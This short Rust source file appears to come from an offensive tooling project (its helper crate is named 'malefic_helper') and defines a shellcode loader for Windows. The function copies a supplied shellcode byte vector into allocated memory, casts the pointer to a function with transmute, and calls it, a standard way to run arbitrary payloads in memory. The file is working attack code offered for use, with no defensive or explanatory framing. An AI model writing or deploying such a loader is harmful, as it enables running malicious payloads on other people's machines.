use malefic_helper::win::dynamic::malloc_and_set_memory;

pub fn loader(shellcode: Vec<u8>) {
    if shellcode.is_empty() {
        return;
    }
    let ptr = malloc_and_set_memory(shellcode);
    if ptr == std::ptr::null_mut() {
        if cfg!(debug_assertions) {
            println!("[-] Get memory pointer failed!");
        }
        return;
    }

    let f: extern "C" fn() = unsafe { std::mem::transmute(ptr) };
    f();
}